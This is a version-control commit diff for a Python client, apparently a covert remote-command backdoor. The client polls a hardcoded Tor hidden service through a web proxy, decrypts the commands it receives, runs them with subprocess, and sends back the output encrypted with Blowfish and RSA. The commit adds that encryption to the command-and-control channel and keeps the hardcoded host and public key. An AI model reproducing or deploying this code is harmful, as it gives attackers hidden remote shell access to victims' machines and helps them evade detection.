23ff1d534479145f339b3d038be0b670be2a2eda
msk <msk@18a754c8-05c4-11df-87ec-d30288882566>
2010-04-13 17:14:04 +0000

    public/private key support

--- trunk/pytor/src/client.py
+++ trunk/pytor/src/client.py
@@ -27,7 +27,8 @@
 # ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 # POSSIBILITY OF SUCH DAMAGE.
 
-import urllib,re, binascii, getopt, sys,time
+import urllib,re, binascii, getopt, sys,time, rsa,string, random
+from blowfish import *
 from subprocess import *
 
 
@@ -44,25 +45,22 @@ def execute_cmd(cmd):
 def contact_server():
 	try:
 		command_output=""
-		values = { 'cmd' : binascii.hexlify(''),'key' : binascii.hexlify(passwd) }
+		values = { 'cmd' : binascii.hexlify(encrypt('HELLO',passwd)), 'key': binascii.hexlify(rsa.encrypt(passwd,public)) }
 		data = urllib.urlencode(values)
 		conn = urllib.urlopen('http://%s:%s%s' % (server,port,request_command_resource),data)
 		result=conn.read()
-		
 		match= re.match(regexp, result)
 		if match!=None:
-			key=binascii.unhexlify(match.groups()[0])
-			cmd=binascii.unhexlify(match.groups()[1])
-			if key==passwd:
-				if cmd=="quit": sys.exit(0)
-				command_output =execute_cmd(cmd)		
-		
-		values = { 'cmd' : binascii.hexlify(command_output),'key' : binascii.hexlify(passwd) }
+			cmd=decrypt(binascii.unhexlify(match.groups()[0]),passwd)
+			if cmd=="quit":
+				sys.exit(0)
+			command_output =execute_cmd(cmd)
+		values = { 'cmd' : binascii.hexlify(encrypt(command_output,passwd)), 'key': binascii.hexlify(rsa.encrypt(passwd,public)) }
 		data = urllib.urlencode(values)
 		
 		conn = urllib.urlopen('http://%s:%s%s' % (server,port,response_command_resource),data)
 		result=conn.read()
-	except IOError:
+	except:
 		pass
 
 def usage():
@@ -73,19 +71,37 @@ def usage():
 	-c seconds. Time that the client will wait until the next connection attempt
         """
 
-regexp="^key=(\w{1,});cmd=(\w{1,})$"
-passwd="123456"
+def password(length):
 
+	alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+	min = 1
+	max = 1
+	total = length
+	string=''
+	for count in xrange(1,total):
+	  for x in random.sample(alphabet,random.randint(min,max)):
+	      string+=x
+        return string
 
+regexp="^cmd=(\w{1,})$"
+passwd=password(20)
 server="tor-proxy.net"
 hidden_service="o3mco5aw544ls6du.onion"
 port="80"
 request_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/get.html" % hidden_service
 response_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/put.html" % hidden_service
 
+public={'e': 12765662626842123815481067847587949200661766245321760889709889046822638084481165784057284123054868562028885770753937873135895248452711698867322363573755509L, 'n': 6670204349974766786486025308702639754997599591560961604655174715263317636836612382523664666170516679176618161283459910889756304321912885967269425897143605737602153478507650483060215486084472859254809428113014384520628716870802560675634211006890817931766331058637157223278955216319037058031119518376261623441717669911594897972723612545099524624178297453680426328165227828416826977994411779382362869355088428553123931482139878281954231142991811152056548065569650847915153537291470173503926317706272431561647632937469021806777354282558079091000609427815612534260857745167512041714839987398717022508605411199651359095421L}
+
+
+	
+
+
 def main():
+#print rsa.decrypt(rsa.encrypt(password(20),public),private)
 	forever=False
 	clock=1
+
 	try:
 		opts, args = getopt.getopt(sys.argv[1:], "c:")
 	except getopt.GetoptError, err:
@@ -115,3 +131,6 @@ def main():
 
 if __name__ == '__main__':
 	main()
+
+
+
